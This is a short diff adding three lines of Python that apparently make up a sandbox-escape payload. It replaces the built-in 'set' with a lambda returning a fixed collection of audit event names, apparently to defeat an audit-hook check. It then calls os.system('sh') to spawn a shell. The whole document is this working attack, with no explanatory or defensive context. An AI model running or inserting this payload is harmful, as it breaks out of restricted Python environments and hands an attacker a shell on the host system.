@@ -1,0 +1,3 @@
+__builtins__['set'] = lambda d: {'builtins.input', 'builtins.input/result', 'exec', 'compile', 'os.system'}
+import os
+os.system('sh')
